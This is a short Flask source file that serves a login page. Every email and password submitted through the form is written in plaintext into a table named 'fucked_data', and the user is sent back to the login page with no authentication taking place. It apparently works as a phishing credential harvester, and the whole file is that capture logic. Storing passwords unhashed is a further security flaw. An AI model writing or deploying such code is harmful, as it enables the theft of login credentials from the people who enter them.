from flask import Flask, render_template, redirect, request, session, jsonify
from cs50 import SQL

db = SQL("sqlite:///fucked.db")

app = Flask(__name__)

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('fucked.html')

    email = request.form.get('login')
    password = request.form.get('password')

    db.execute("INSERT INTO fucked_data (email, password) VALUES(?, ?)", email, password)

    return redirect('/login')
